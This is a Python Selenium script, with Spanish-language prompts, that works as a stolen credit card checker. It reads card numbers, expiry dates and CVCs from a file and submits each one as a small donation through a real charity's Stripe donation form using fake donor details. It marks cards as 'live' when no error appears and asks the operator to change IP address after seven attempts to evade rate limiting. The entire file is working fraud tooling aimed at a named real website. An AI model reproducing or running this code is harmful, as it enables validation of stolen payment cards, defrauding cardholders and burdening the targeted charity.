from os import system
try:
    from colorama import Fore, Style
    from selenium import webdriver
    from selenium.webdriver.support.ui import WebDriverWait, Select
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.by import By
    from string import ascii_lowercase
    from time import sleep
    import random
    import textwrap
except:
    system('pip install colorma, selenium')
    from colorama import Fore, Style
    from selenium import webdriver
    from selenium.webdriver.support.ui import WebDriverWait, Select
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.by import By
    from string import ascii_lowercase
    from time import sleep
    import random
    import textwrap
system('cls')

def stripe(webdriverop, ccs):
    if webdriverop == 2:
        op = webdriver.FirefoxOptions()
        op.add_argument('--headless')
        driver = webdriver.Firefox(options=op)
    else:
        op = webdriver.ChromeOptions()
        op.add_experimental_option('excludeSwitches', ['enable-logging'])
        op.add_argument('--headless')
        driver = webdriver.Chrome(options=op)
    i = 1
    cook = 'no'
    driver.get('https://passionforthenation.uk/donate/')
    element = driver.find_element(By.ID, 'wpforms-273062-field_2')
    driver.execute_script("arguments[0].setAttribute('value', '5')", element)
    WebDriverWait(driver, 60) \
        .until(EC.element_to_be_clickable((By.ID, 'wpforms-273062-field_0'))) \
        .send_keys('Raul')
    WebDriverWait(driver, 60) \
        .until(EC.element_to_be_clickable((By.ID, 'wpforms-273062-field_0-last'))) \
        .send_keys('Perez')
    WebDriverWait(driver, 60) \
        .until(EC.element_to_be_clickable((By.ID, 'wpforms-273062-field_1'))) \
        .send_keys('raupito@gmail.com')
    for cca in ccs:
        if i >= 7:
            input('ya ha alcanzado 7 intentos, para continuar, por favor cambie su ip y presione "enter"')
            i = 1
        elif i == 2 and cook == 'no':
            WebDriverWait(driver, 60) \
                .until(EC.element_to_be_clickable((By.ID, 'cn-accept-cookie'))) \
                .click()
            cook = 'yes'
        else:
            pass
        a = cca.replace('/', '|').replace(' ', '|').replace(':', '|')
        c = a.split('|')
        ccd = c[0]
        cvc = c[3]
        mt = int(c[1])
        ye = int(c[2].replace('20', ''))
        ccf = textwrap.wrap(ccd, 4)
        for cc in ccf:
            WebDriverWait(driver, 60) \
                .until(EC.element_to_be_clickable((By.ID, 'wpforms-273062-field_5'))) \
                .send_keys(cc)
        WebDriverWait(driver, 60) \
            .until(EC.element_to_be_clickable((By.ID, 'wpforms-273062-field_5-cardcvc'))) \
            .send_keys(cvc)
        WebDriverWait(driver, 60) \
            .until(EC.element_to_be_clickable((By.ID, 'wpforms-273062-field_5-cardname'))) \
            .send_keys('raul pito')
        Select(driver.find_element('id', 'wpforms-273062-field_5-cardmonth')).select_by_index(int(mt))
        Select(driver.find_element('id', 'wpforms-273062-field_5-cardyear')).select_by_index(int(ye - 22))
        WebDriverWait(driver, 60) \
            .until(EC.element_to_be_clickable((By.ID, 'wpforms-submit-273062'))) \
            .click()
        try:
            WebDriverWait(driver, 5) \
                .until(EC.element_to_be_clickable((By.XPATH,'/html/body/div[1]/div[1]/div[2]/div/article/div/div/div/div[2]/div/div/div[2]/div/div/form/div[3]')))
            respoce = driver.find_element('xpath', '/html/body/div[1]/div[1]/div[2]/div/article/div/div/div/div[2]/div/div/div[2]/div/div/form/div[3]')
            try:
                responce = respoce.text.split('Error: ')[1]
            except:
                responce = respoce.text
            print(Fore.RED + f'{cca} | ' + responce + Fore.RESET)
            with open('responces.txt', 'a') as f:
                f.write(f'{cca} | {responce}\n')
                f.close()
        except:
            responce = 'live'
            print(Fore.GREEN + f'{cca} | ' + responce + Fore.RESET)
            with open('responces.txt', 'a') as f:
                f.write(f'{cca} | {responce}\n')
                f.close()
        i += 1
    driver.close()

if __name__ == "__main__":
    print('1- Chrome \n2- Firefox' + Fore.RED + '(RECOMENDADO)' + Fore.RESET)
    web = int(input('porfavor seleccione su navegador:: '))
    print()
    ccs = open('ccs.txt').read().split()
    stripe(web, ccs)